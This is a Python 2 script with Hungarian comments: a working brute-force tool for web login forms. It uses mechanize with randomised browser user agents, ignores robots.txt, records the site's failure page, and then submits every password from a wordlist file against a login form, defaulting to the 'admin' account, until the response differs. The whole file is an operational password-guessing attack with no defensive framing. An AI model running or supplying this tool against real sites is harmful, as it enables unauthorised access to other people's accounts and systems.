# -*- coding: utf-8 -*-

import mechanize
import random

USER_AGENTS = ('Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:11.0) Gecko/20100101 Firefox/11.0',
                'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:22.0) Gecko/20100 101 Firefox/22.0',
                'Mozilla/5.0 (Windows NT 6.1; rv:11.0) Gecko/20100101 Firefox/11.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.46 Safari/536.5',
                'Mozilla/5.0 (Windows; Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.46 Safari/536.5')

def test_wrong(url, testacc="azzswersdpqwasdz", testpass="1á11110000ábéćé", form_id=None, acc_field="account", pwd_field="password"):
    '''
    nem üreset küldönk, mert akkor hibát dobhat, de nem is tele jelekkel, mert azt lehet nem fogadná el
    '''
    
    br = mechanize.Browser()
    br.set_handle_equiv(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    br.addheaders = [('User-agent', random.choice(USER_AGENTS))]
    br.open(url)
    
    for form in br.forms():
        print "Form name:", form.name
        print form
    
    try:
        if form_id == None:
            br.select_form(nr=0)
        else:
            formcount = 0
            for frm in br.forms():
                if str(frm.attrs["id"]) == form_id:
                    break
                formcount = formcount + 1
            br.select_form(nr=formcount)
    except:
        return 1, "Wrong ID!"
    
    try:
        br.form[acc_field] = testacc
        br.form[pwd_field] = testpass
    except:
        return 1, "wrong Account or Password field!"
        
    res = br.submit()
    return res.read()  # url amire átirányít az oldal miután elküldtük a formot


def brute_force(url, acc, pwd, wrong_page, form_id=None, acc_field="account", pwd_field="password"):  # wrong_page egy HTML documentum amihez aztán tudjuk hasonlítani a hiba oldalt
    
    br = mechanize.Browser()
    br.set_handle_equiv(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    br.addheaders = [('User-agent', random.choice(USER_AGENTS))]
    
    br.open(url)
    
    if form_id == None:
        br.select_form(nr=0)
    else:
        formcount = 0
        for frm in br.forms():
            if str(frm.attrs["id"]) == form_id:
                break
            formcount = formcount + 1
        br.select_form(nr=formcount)
        
    br.form[acc_field] = acc
    br.form[pwd_field] = pwd
    res = br.submit()
    
    if res.read() == wrong_page:
        return False
    else:
        return pwd

    
    ####
if __name__ == '__main__':
    
    import sys
    url = sys.argv[1]
    
    from misc import check_if_exists
    if check_if_exists(url):
        
        acc="admin"
        form_id=None
        acc_field="account"
        pwd_field="password"
        
        if len(sys.argv)>2:
            acc=sys.argv[2]
            
            if len(sys.argv)>3:
                form_id=sys.argv[3]
            if len(sys.argv)>4:
                acc_field=sys.argv[4]    
            if len(sys.argv)>5:
                pwd_field=sys.argv[5]   
                
        
        wrong_page = test_wrong(url,"azzswersdpqwasdz","1á11110000ábéćé", form_id, acc_field, pwd_field)
        if wrong_page[0] == 1:
            print wrong_page[1]
        else:
            f = open("text-files/passwords.txt").read().split("\n")
            for pwd in f:
                if brute_force(url, acc, pwd, wrong_page, form_id, acc_field, pwd_field) == False:
                    print "Helytelen: " + pwd
                else:
                    print "Megvan a jelszó: " + pwd
                    break
            print "Jelszó nem található!"
    
    else:
        print "Hiba az oldal betöltésénél!"
